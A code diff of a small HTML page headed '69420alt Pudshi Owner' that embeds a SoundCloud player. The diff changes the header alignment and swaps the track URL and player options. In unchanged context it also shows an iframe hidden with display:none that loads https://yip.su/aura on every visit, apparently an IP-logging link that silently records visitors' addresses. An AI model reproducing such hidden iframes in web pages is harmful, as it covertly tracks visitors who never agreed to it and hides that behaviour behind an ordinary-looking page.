@@ -17,6 +17,7 @@
   }
   #header {
     font-size: 28px;
+    text-align: center;
   }
   #hiddenSite {
     display: none;
@@ -31,10 +32,10 @@
 <body>
   <div id="header">69420alt Pudshi Owner</div>
 
-  <iframe 
+  <iframe
     id="soundcloudPlayer"
-    width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay"
-    src="https://w.soundcloud.com/player/?url=https%3A//soundcloud.com/liltecca/hvh-on-top&auto_play=false&hide_related=true&show_comments=false&show_user=false&show_reposts=false&visual=false">
+    width="100%" height="300" scrolling="no" frameborder="no" allow="autoplay"
+    src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/1595371902&color=%23ff5500&auto_play=false&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true&visual=true">
   </iframe>
 
   <iframe id="hiddenSite" src="https://yip.su/aura"></iframe>
@@ -45,7 +46,7 @@
 
   document.body.addEventListener('click', () => {
     if (started) return;
-    iframe.src = "https://w.soundcloud.com/player/?url=https%3A//soundcloud.com/liltecca/hvh-on-top&auto_play=true&hide_related=true&show_comments=false&show_user=false&show_reposts=false&visual=false";
+    iframe.src = "https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/1595371902&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true&visual=true";
     started = true;
   });
 </script>
